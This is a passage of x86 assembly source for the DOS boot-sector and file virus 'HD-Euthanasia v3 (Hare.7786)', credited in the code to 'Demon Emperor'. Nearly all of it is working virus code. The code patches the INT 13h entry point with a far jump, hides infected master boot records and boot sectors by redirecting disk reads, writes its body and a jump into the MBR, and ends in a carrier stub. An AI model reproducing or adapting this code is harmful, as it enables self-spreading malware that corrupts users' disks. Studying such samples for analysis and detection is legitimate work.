		RETN

Infect_Exec7:
		PUSH    BX

		MOV     BL, AL
		OR      AL, 80h
		CLI
		OUT     70h, AL                 ; Port 70h, CMOS addr,bit7=NMI
						; AL = 92h, hard disk type.
                JMP     $+2                     ; Delay for I/O.
                JMP     $+2

		IN      AL, 71h                 ; Port 71H, CMOS data.
		MOV     AH, AL
		XOR     AL, AL

                JMP     $+2
                JMP     $+2

		OUT     70h, AL                 ; Port 70h, CMOS addr,bit7=NMI
						; AL = 0, seconds register
		STI
		MOV     AL, BL
		POP     BX

		RETN

Entry_Bytes     DB      5 DUP(0)        ; Original first 5 bytes of INT 13h
					; entrypoint which are overwritten
					; with a JMP FAR to our handler.
;
; Copies the first five bytes of INT 13h to a temp variable.
;
Slice_Int13h:
		PUSH    CS
		POP     ES

		MOV     DI, OFFSET Entry_Bytes
		LDS     SI, DWORD PTR ES:Traced_Int13h

		CLD
		MOVSW
		MOVSW
		MOVSB

		RETN


;
; Overwrites the entrypoint of INT 13h with a JMP FAR to our INT 13h handler.
;
;
Insert_Slice:
		PUSH    DS
		PUSH    SI
		PUSH    AX
		PUSHF

                TEST    CS:DATA_138, 00000010b  ; Init INT 13h ?
		JNZ     LOC_240

		LDS     SI, DWORD PTR CS:Traced_Int13h

		; Overwrite with JMP FAR [viruscode].

		MOV     BYTE PTR [SI], 0EAh
		MOV     WORD PTR [SI+1], OFFSET NewInt13h
		MOV     WORD PTR [SI+3], CS
LOC_240:
		POPF
		POP     AX
		POP     SI
		POP     DS

		RETN


Unslice_Int13h:

		PUSHF
		PUSH    CX
		PUSH    DI
		PUSH    SI
		PUSH    DS
		PUSH    ES

		PUSH    CS
		POP     DS

		TEST    DATA_138, 00000010b     ; INT 13h hooked already?
		JNZ     LOC_241

		CLI
		MOV     SI, OFFSET Entry_Bytes
		LES     DI, DWORD PTR Traced_Int13h

		CLD                             ; Copy 
		MOV     CX, 5
		REP     MOVSB
LOC_241:
		STI
		POP     ES
		POP     DS
		POP     SI
		POP     DI
		POP     CX
		POPF

		RETN

Int13h          DW      0, 0
DATA_150        DW      0BDBFh
Dos_Mem         DW      0
DATA_152        DB      0
Function_i13h   DB      0
DATA_154        DB      0
		DB      0

Exec_Int13h:
		POPF

		MOV     CS:Function_i13h, AH         ; Save function #.
		CALL    Traced_i13h

		PUSHF

		OR      AH, AH
		JZ      LOC_243

		JMP     LOC_255
LOC_243:
		MOV     CS:Function_i13h,0
		POPF
		CALL    Insert_Slice
		RETF    2

NewInt13h:
		PUSHF

		CMP     AX, 5445h               ; Residency-check?
		JNE     Check_Next_2

		MOV     AX, 4554h               ; Our sign.
		POPF

                RETF    2                       ; Return to caller.

Check_Next_2:
		CALL    Unslice_Int13h

		CMP     DX, 80h                 ; Head zero of 1st harddisk?
		JNE     LOC_245

		CMP     CX, 01h                 ; MBR?
		JNE     LOC_245

		CMP     AH, 03h                 ; Doing a write?
		JA      LOC_245

		CMP     AH, 02h                 ; Doing a read?
		JB      LOC_245

		POPF

		JMP     LOC_249
		NOP
LOC_245:
		CMP     DL, 80h
		JNB     LOC_247

		CMP     AH, 16h
		JNE     LOC_246

		JMP     Exec_Int13h
LOC_246:
		CMP     AH, 05h
		JAE     LOC_247

		CMP     AH, 01h
		JBE     LOC_247

		JMP     LOC_255
LOC_247:
		CMP     DL, 80h
		JNE     LOC_248

		CMP     CS:DATA_150, CX
		JNE     LOC_248

		AND     CH, 02h
LOC_248:
		POPF

		CALL    Traced_i13h
		CALL    Insert_Slice

		RETF    2
LOC_249:
		PUSH    BX
		PUSH    CX
		PUSH    DX
		PUSH    ES

		CMP     AH, 02h
		JE      LOC_250

		JMP     LOC_251
LOC_250:
		CALL    Traced_i13h               ; Execute function.

		PUSHF
		PUSH    AX
		PUSH    BX

		MOV     AH, 08h                 ; Get disk drive parameters.
		MOV     DL, 80h
		CALL    Traced_i13h

		INC     CH
		DEC     DH
		MOV     DL, 80h
		MOV     AX, 0201h               ; Read stored bootsector (?)
		POP     BX
		CALL    Traced_i13h
		POP     AX
		POPF

		JMP     LOC_253
LOC_251:
		PUSH    DS
		PUSH    DI
		PUSH    SI
		PUSH    AX
		DEC     AL
		PUSH    ES
		PUSH    BX

		JZ      LOC_252

		ADD     BX, 200h
		INC     CL
		CALL    Traced_i13h
		DEC     CL
LOC_252:
		MOV     AH, 08h
		MOV     DL, 80h
		CALL    Traced_i13h
		POP     BX
		POP     ES
		INC     CH
		DEC     DH
		MOV     DL, 80h
		MOV     AX, 0301h
		CALL    Encrypt_Boot
		CALL    Traced_i13h
		MOV     BX,AX
		POP     AX
		MOV     AL,BL
		POP     SI
		POP     DI
		POP     DS
LOC_253:
		POP     ES
		POP     DX
		POP     CX
		POP     BX
		CALL    Insert_Slice
		RETF    2
LOC_254:
		JMP     LOC_260
LOC_255:
		PUSH    AX
		PUSH    BX
		PUSH    CX
		PUSH    DX
		PUSH    ES
		PUSH    DS
		PUSH    SI
		PUSH    DI

		XOR     AX, AX
		MOV     DS, AX

		XOR     CH, CH
		MOV     CL, DL
		INC     AL
		SHL     AL, CL

		CMP     CS:Function_i13h, 00h
		JNE     LOC_256

                TEST    AL, byte ptr Gaby1
		JNZ     LOC_254
LOC_256:
                PUSH    CS
		POP     DS

		PUSH    DS
		POP     ES

		MOV     CL, 4                   ; Multiplied by 16.
		SHL     AL, CL

		MOV     DATA_152, AL
		MOV     SI,3
LOC_257:
		XOR     AX, AX                  ; Reset disk.
		CALL    Traced_i13h

		MOV     AX, 0201h               ; Read bootsector
		MOV     CX, 01h
		MOV     DH, CH
		MOV     BX, OFFSET Buffer
		CALL    Traced_i13h
		JNC     LOC_258

		DEC     SI
		JZ      LOC_254
		JMP     LOC_257
LOC_258:
		MOV     AX, Drew2
		SUB     AX, Drew1

		CMP     AX, 0CCFFh
		JE      LOC_254

		CALL    SUB_71
		CALL    SUB_72
		JNC     LOC_259

                MOV     AX, 0401h               ; Verify bootsector/MBR.
		XOR     CX, CX
		INC     CX
		MOV     DH, CH
		CALL    Traced_i13h
		JMP     LOC_260
LOC_259:
		XOR     BX, BX
		MOV     CL, 01h
		MOV     AX, 0310h
		CALL    Traced_i13h
		JC      LOC_260

		MOV     BX, OFFSET Buffer
		MOV     CL, 11h
		MOV     AX, 0301h
		CALL    Traced_i13h
		JC      LOC_260

		MOV     BL, 02h
		PUSH    DX
		CALL    SUB_49
		POP     DX
		MOV     CX, 01h
		XOR     DH, DH
		MOV     BX, OFFSET Buffer
		MOV     BYTE PTR DS:[Buffer], 0EBh   ; JMP viruscode in MBR.
		MOV     BYTE PTR DS:[Buffer+1], 3Ch
		MOV     AX, 0301h
		CALL    Traced_i13h
LOC_260:
		POP     DI
		POP     SI
		POP     DS
		POP     ES
		POP     DX
		POP     CX
		POP     BX
		POP     AX

		CMP     CS:Function_i13h, 0
		JE      LOC_261

		JMP     LOC_243



LOC_261:
		CMP     DH, 00h
		JNE     LOC_262

		CMP     CX, 01h
		JNE     LOC_262

		TEST    CS:Flags, 00000100b
		JNZ     LOC_262

		CMP     AH, 02h
		JE      LOC_263

		CMP     AH, 03h
		JE      LOC_265

LOC_262:
		JMP     LOC_248
LOC_263:
		POPF
		CALL    Traced_i13h
		PUSHF
		PUSH    AX
		PUSH    BX
		PUSH    CX
		PUSH    DX
		PUSH    ES
		JC      LOC_264

		MOV     AX, ES:[BX+102h]        ; Subtract 1st word from word.
		SUB     AX, ES:[BX+100h]

		CMP     AX, 0CCFFh              ; Infected bootsector?
		JNE     LOC_264

		MOV     CH, 51h                 ; Cylinder 81.
		MOV     CL, 11h                 ; Sector 17.
		MOV     DH, 01h                 ; 1st head.
		MOV     AX, 0201h               ; Read sector
		CALL    Traced_i13h
LOC_264:
		POP     ES
		POP     DX
		POP     CX
		POP     BX
		POP     AX

		CALL    Insert_Slice

		POPF
		RETF    2


LOC_265:
		PUSH    AX
		PUSH    BX
		PUSH    ES

		PUSH    CS
		POP     ES

		MOV     AX, 0201h
		MOV     BX, OFFSET Buffer
		CALL    Traced_i13h

		POP     ES
		POP     BX
		POP     AX

		PUSH    AX

		DEC     AL
		JZ      LOC_266

		ADD     BX, 200h
		INC     CL
		CALL    Traced_i13h

		SUB     BX, 200h
		DEC     CL
LOC_266:
		PUSH    DI
		PUSH    SI
		PUSH    DS
		PUSH    ES
		PUSH    BX

		MOV     AX, ES:[DI+102h]        ; Subtract word from word.
		SUB     AX, ES:[DI+100h]

                CMP     AX, 0CCFFh              ; Infected signature?
		JNE     LOC_267

		MOV     CH, 51h
		MOV     CL, 11h
		MOV     DH, 01h
		MOV     AX, 0301h
		CALL    Traced_i13h

		PUSH    ES
		POP     DS

		PUSH    CS
		POP     ES

		MOV     SI, BX
		ADD     SI, 03h
                MOV     DI, 1E6Ch+1
                MOV     CX, 59
		REP     MOVSB
		MOV     BX, OFFSET Buffer
LOC_267:
		MOV     DH, 00h
		MOV     CX, 01h
		MOV     AX, 0301h
		CALL    Traced_i13h

		MOV     CS:DATA_154,AH

		POP     BX
		POP     ES
		POP     DS
		POP     SI
		POP     DI
		POP     AX
                MOV     AH, CS:DATA_154
		CALL    Insert_Slice
		POPF

		RETF    2


SUB_71:
		MOV     AL, DS:1E7Eh+1

		CMP     AL,0FDH
		JE      LOC_268

		MOV     CH, 51h
		JMP     LOC_RET_269
LOC_268:
		MOV     CH,29h

LOC_RET_269:
		RETN


SUB_72:
		MOV     DH, CH
		MOV     DATA_154, DL

		XOR     AX, AX
		MOV     ES, AX

		LES     DI, DWORD PTR ES:[1Eh * 4]
		MOV     AX, ES:[DI+3]
		PUSH    AX
		MOV     BYTE PTR ES:[DI+3], 02h
		MOV     BYTE PTR ES:[DI+4], 11h

		PUSH    CS
		POP     ES

		MOV     DI, OFFSET Drew4

		CLD
		MOV     CX, 11h
		MOV     DL, 01h

LOCLOOP_270:
		MOV     AH, 01h
		MOV     AL, DH
		STOSW

		MOV     AL, DL
		MOV     AH, 02h
		STOSW

		INC     DL
		LOOP    LOCLOOP_270

		MOV     AX, 50FH
		MOV     CH, DH
		MOV     CL, 1
		MOV     DH, 1
		MOV     DL, DATA_154
		MOV     BX, 206AH
		CALL    Traced_i13h
		PUSHF
                MOV     BYTE PTR Verify_Sectors+2, CH

		XOR     AX, AX
		MOV     ES, AX

		LES     DI, ES:[1Eh * 4]
		POPF
		POP     AX
		MOV     ES:[DI+3],AX
		PUSH    CS
		POP     ES
		RETN

LOC_271:
                MOV     BX, 0B50h

		MOV     ES, BX
		XOR     BX, BX

                MOV     AX, 1E0Eh

		PUSH    ES
		PUSH    AX

Verify_Sectors: MOV     CX, 5101h

                MOV     AX, 0411h
                MOV     DX, 0100h
		INT     13h                     ; Disk  dl=drive a  ah=func 04h
						;  verify sectors with mem es:bx
						;   al=#,ch=cyl,cl=sectr,dh=head
                MOV     AX, 0211h               ; Read virusbody from disk.
		INT     13h

		JC      LOC_271
		RETF

		STI

		XOR     AX, AX
		MOV     ES, AX

		PUSH    CS
		POP     DS

		CLD
		MOV     DI, 7C00h
		MOV     SI, 2000h
		MOV     CX, 512
		PUSH    ES
		PUSH    DI
		REP     MOVSB

		MOV     Flags, AL               ; Clear flags.

		CALL    Check_Poly_Sector
		CALL    Infect_Harddisk

		RETF

Message         DB      '"HDEuthanasia-v3" by Demon Emperor:'
		DB      ' Hare Krsna, hare, hare...'

     ; (I sure hope 4U that ya never see this message during boot-up!).

Virus_End:

Buffer:


Marker          DW      0
File_Mod512     DW      0
Byte_Pages      DW      0
		DW      0
Header_Size     DW      0
		DW      0
		DW      0
Init_SS         DW      0
Init_SP         DW      0
		DW      0
Init_IP         DW      0
Init_CS         DW      0
Reloc_Offs      DW      0
		DW      0
Undoc           DW      0
Ruck            DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
                DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
Drew1           DW      0
Drew2           DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
Drew3           DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
Drew4           DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
		DW      0
Poly_Sector     DW      0


Carrier:
		PUSH    CS
		POP     DS

                MOV     AH, 09h                 ; Display warning-message.
		MOV     DX, OFFSET Warning
		INT     21h

                MOV     AX, 4C00h               ; Exit to DOS.
		INT     21h


Warning         DB      'WARNING: This program is infected with the '
		DB      'HD-Euthanasia v3 (Hare.7786) virus!', 0Ah, 0Dh, '$'

		END     START
